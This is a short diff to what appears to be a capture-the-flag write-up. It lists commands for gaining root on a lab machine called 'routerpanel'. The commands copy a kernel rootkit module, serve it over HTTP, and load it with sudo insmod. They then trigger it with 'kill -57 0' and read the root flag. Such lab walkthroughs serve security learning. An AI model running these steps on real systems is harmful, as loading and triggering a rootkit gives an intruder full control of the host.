@@ -85,6 +85,7 @@ User athena may run the following commands on routerpanel:
 > cp /mnt/.../secret/venom.ko ~/venom.ko
 > python3 -m http.server 7000 # wget <IP&PORT>/venom.ko
 > # ran cutter on local for analysis => it's a rootkit => can be triggered by `kill -57 0`
+> sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
 > kill -57 0
 > whoami
 > cat /root/root.txt # got root flag
